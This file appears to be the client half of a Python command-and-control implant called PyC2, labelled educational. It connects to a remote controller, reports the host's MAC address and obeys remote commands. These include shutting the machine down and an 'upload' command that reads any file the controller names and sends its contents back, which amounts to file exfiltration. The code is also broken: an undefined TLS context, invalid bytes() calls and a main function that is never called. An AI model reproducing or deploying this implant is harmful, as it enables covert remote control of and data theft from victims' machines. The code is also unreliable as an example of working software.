# PyC2 - Python C2 Client/Server Framework
# Created for educational purposes only.

import socket
import ssl
from datetime import datetime
import threading
import uuid
import sys
import os

host = ""
port = 443
CERT_PATH = "localhost.pem"

def main(host, port, cert):

	context.load_verify_locations(cert)
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((host,port))
		mac = uuid.getnode()
		s.sendall(bytes(mac,"utf-8"))

		while True:

			cmd=s.recv(2048).decode('utf-8')
			if cmd == "kill":
				s.sendall(bytes("Killing client..","utf-8"))
				sys.exit()

			elif cmd == "shutdown":
				s.sendall(bytes("Shutting down client..","utf-8"))
				os.system("shutdown /s /t 1")

			elif cmd == "report":
				mac = uuid.getnode()
				s.sendall(bytes(mac,"utf-8"))

			elif "upload" in cmd:
				try:
					path = cmd.split(" ")[1]
					with open(path,'rb') as f:
						data = f.read()
					s.sendall(data)
				except Exception as e:
					s.sendall(bytes(e,"utf-8"))
					pass
			else:
				pass
